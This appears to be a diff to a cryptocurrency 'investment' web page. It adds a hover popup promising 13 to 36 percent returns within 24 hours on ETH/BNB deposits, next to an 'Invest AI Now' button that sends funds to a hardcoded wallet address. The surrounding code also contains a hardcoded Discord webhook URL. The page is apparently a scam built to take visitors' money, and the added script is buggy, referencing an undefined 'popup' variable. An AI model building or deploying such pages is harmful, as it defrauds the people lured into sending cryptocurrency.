@@ -722,6 +722,21 @@ setInterval(() => {
     from, to { opacity: 0 }
     50% { opacity: 1 }
   }
+#popup2 {
+  display: none;
+  position: absolute;
+  background-color: #fff;
+  border: 1px solid #ddd;
+  box-shadow: 0px 2px 10px rgba(0,0,0,0.5);
+  padding: 20px;
+  z-index: 1;
+  width: 300px;
+  text-align: center;
+}
+
+#popup2 p {
+  margin: 10px 0;
+}
 
 
 </style>
@@ -760,7 +775,14 @@ setInterval(() => {
 
 
 
-<input type="number" id="amount1">
+<input type="number" id="amount1" onmouseover="showPopup()" onmouseout="hidePopup()">
+<div id="popup2">
+  <p>Send 0.01 ETH/BNB - 13% profitability algorithm</p>
+  <p>Send 0.1 ETH/BNB - 23% profitability algorithm</p>
+  <p>Send 1 ETH/BNB - 36% profitability algorithm</p>
+  <p>Once the amount is sent, your return will be ready in your wallet exactly 24 hours after the deposit is made.</p>
+</div>
+
   <div style="text-align: center;">
   <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Invest AI Now</button>
 </div>
@@ -815,6 +837,35 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
+	  <script>
+		  function showPopup() {
+  var popup2 = document.getElementById("popup2");
+  popup.style.display = "block";
+  var percentage = 13;
+  var paragraphs = popup.getElementsByTagName("p");
+  for (var i = 0; i < paragraphs.length; i++) {
+    var text = paragraphs[i].innerText;
+    var match = text.match(/\d+% profitability/);
+    if (match) {
+      var currentPercentage = parseInt(match[0]);
+      if (currentPercentage !== percentage) {
+        var difference = percentage - currentPercentage;
+        var newPercentage = currentPercentage;
+        while (newPercentage !== percentage) {
+          newPercentage += (difference > 0 ? 1 : -1);
+          paragraphs[i].innerText = text.replace(currentPercentage + "%", newPercentage + "%");
+        }
+      }
+      percentage += 10;
+    }
+  }
+}
+
+function hidePopup() {
+  var popup2 = document.getElementById("popup2");
+  popup.style.display = "none";
+}
+	  </script>
 	
 
 
